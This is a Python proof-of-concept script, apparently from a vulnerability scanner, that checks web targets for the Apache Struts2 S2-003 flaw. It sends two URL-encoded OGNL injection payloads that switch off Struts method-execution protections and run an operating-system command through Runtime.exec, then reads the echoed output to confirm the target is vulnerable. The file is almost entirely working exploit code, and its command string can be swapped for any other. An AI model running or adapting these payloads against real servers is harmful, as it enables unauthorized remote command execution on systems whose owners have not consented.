import warnings
import requests
import random

warnings.filterwarnings("ignore")



def poc(url):
    timeout = 15
    proxies = {'http': '127.0.0.1:9999'}
    ran_a = random.randint(10000000, 20000000)
    ran_b = random.randint(1000000, 2000000)
    ran_check = ran_a - ran_b
    check = [ran_check, '无法初始化设备 PRN', '??????? PRN','Unable to initialize device PRN']
    lin = 'expr' + ' ' + str(ran_a) + ' - ' + str(ran_b)
    poc_goop = [
        r"(%27\u0023context[\%27xwork.MethodAccessor.denyMethodExecution\%27]\u003dfalse%27)(bla)(bla)&(%27\u0023_memberAccess.excludeProperties\u003d@java.util.Collections@EMPTY_SET%27)(kxlzx)(kxlzx)&(%27\u0023mycmd\u003d\%27print goop\%27%27)(bla)(bla)&(%27\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\u0023mycmd)%27)(bla)(bla)&(A)((%27\u0023mydat\u003dnew\40java.io.DataInputStream(\u0023myret.getInputStream())%27)(bla))&(B)((%27\u0023myres\u003dnew\40byte[51020]%27)(bla))&(C)((%27\u0023mydat.readFully(\u0023myres)%27)(bla))&(D)((%27\u0023mystr\u003dnew\40java.lang.String(\u0023myres)%27)(bla))&(%27\u0023myout\u003d@org.apache.struts2.ServletActionContext@getResponse()%27)(bla)(bla)&(E)((%27\u0023myout.getWriter().println(\u0023mystr)%27)(bla))",
        r"(%27\u0023context[\%27xwork.MethodAccessor.denyMethodExecution\%27]\u003dfalse%27)(bla)(bla)&(%27\u0023_memberAccess.excludeProperties\u003d@java.util.Collections@EMPTY_SET%27)(kxlzx)(kxlzx)&(%27\u0023mycmd\u003d\%27" + lin + r"\%27%27)(bla)(bla)&(%27\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\u0023mycmd)%27)(bla)(bla)&(A)((%27\u0023mydat\u003dnew\40java.io.DataInputStream(\u0023myret.getInputStream())%27)(bla))&(B)((%27\u0023myres\u003dnew\40byte[51020]%27)(bla))&(C)((%27\u0023mydat.readFully(\u0023myres)%27)(bla))&(D)((%27\u0023mystr\u003dnew\40java.lang.String(\u0023myres)%27)(bla))&(%27\u0023myout\u003d@org.apache.struts2.ServletActionContext@getResponse()%27)(bla)(bla)&(E)((%27\u0023myout.getWriter().println(\u0023mystr)%27)(bla))"
    ]
    headers = {
        "Accept": "application/x-shockwave-flash, image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*",
        "User-Agent": 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0',
        "Content-Type": "application/x-www-form-urlencoded"
    }
    try:
        for test in poc_goop:
            # req = requests.post(url, headers=headers, data=test, timeout=timeout, verify=False, proxies=proxies)
            req = requests.post(url, headers=headers, data=test, timeout=timeout, verify=False, )
            result = "目标存在 Struts2-003, check url: %s" % url
            for c in check:
                if str(c) in req.text:
                    return result
    except:
        pass
